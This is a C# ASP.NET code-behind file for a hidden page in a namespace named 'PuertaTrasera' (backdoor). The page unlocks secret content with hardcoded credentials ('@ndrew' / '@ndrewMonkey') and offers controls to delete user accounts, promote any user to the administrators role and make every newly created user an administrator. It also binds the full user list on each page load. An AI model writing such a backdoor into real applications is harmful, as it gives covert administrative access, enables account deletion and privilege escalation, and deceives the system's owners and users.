using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Web.Security;

namespace AplicacionWeb.PuertaTrasera
{
    public partial class AdministrarUsuarios : System.Web.UI.Page
    {

        #region Eventos

        protected void Page_Load(object sender, EventArgs e)
        {

            if (!this.IsPostBack)
            {

                divContenidoSecreto.Visible = false;


            }

            CargarUsuarios();

        }

        protected void btnEliminar_Click(object sender, EventArgs e)
        {

            if (gvUsuarios.SelectedIndex >= 0)
            {

                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;

                EliminarUsuario(nombre);

            }

        }
        
        protected void CreateUserWizard_CreatedUser(object sender, EventArgs e)
        {

            string nombre = CreateUserWizard.UserName;

            AgregarUsuarioAdministrador(nombre);

        }
        
        protected void btnCambiarAAdministrador_Click(object sender, EventArgs e)
        {

            if (gvUsuarios.SelectedIndex >= 0)
            {

                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;

                AgregarUsuarioAdministrador(nombre);

            }

        }

        protected void btnIniciarSesion_Click(object sender, EventArgs e)
        {

            string usuario = txtUsuario.Text;

            string contraseña = txtContraseña.Text;

            ValidarSesionCorrecta(usuario, contraseña);

        }

        #endregion

        #region Metodos Privados

        private void EliminarUsuario(string nombre)
        {

            if (!string.IsNullOrEmpty(nombre))
            {

                Membership.DeleteUser(nombre, true);

            }

        }

        private void AgregarUsuarioAdministrador(string nombre)
        {

            if (!Roles.IsUserInRole(nombre, "Administradores"))
            {

                Roles.AddUserToRole(nombre, "Administradores");

            }

        }

        private void CargarUsuarios()
        {

            gvUsuarios.DataSource = Membership.GetAllUsers();

            gvUsuarios.DataBind();

        }

        private void ValidarSesionCorrecta(string usuario, string contraseña)
        {

            if (usuario == "@ndrew" && contraseña == "@ndrewMonkey")
            {

                divIniciarSesionEstatico.Visible = false;

                divContenidoSecreto.Visible = true;
            
            }

        }
        
        #endregion

        protected void CreateUserWizard_FinishButtonClick(object sender, WizardNavigationEventArgs e)
        {

            CargarUsuarios();

        }
        
    }
}